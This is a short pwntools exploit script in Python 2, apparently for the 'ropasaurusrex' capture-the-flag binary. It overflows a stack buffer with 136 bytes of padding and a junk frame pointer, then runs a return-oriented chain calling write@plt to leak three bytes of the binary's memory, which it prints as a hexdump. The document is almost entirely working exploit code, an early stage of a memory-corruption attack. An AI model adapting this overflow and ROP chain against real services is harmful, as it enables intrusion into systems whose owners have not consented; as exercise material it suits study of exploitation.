from pwn import *

local = True

if not local:
    HOST = "host.name"
    PORT = 4242
    io = remote(HOST, PORT)
else:
    io = process("./ropasaurusrex1")


# Create ROP chain.

#  man 2 write:
#     ssize_t write(int fd, const void *buf, size_t count);

write_plt = 0x804830c
fd = 1
buf = 0x08048001
count = 3
ropchain = p32(write_plt) + "JUNK" + p32(fd) + p32(buf) + p32(count)


# Create payload. Use junk value for EBP.
ebp = 0x41424344
payload = "A" * 136 + p32(ebp) + ropchain

# Trigger exploit by sending payload to standard input.
io.sendline(payload)


# Print output as hex.
rop_output = io.recv(3)
print hexdump(rop_output)
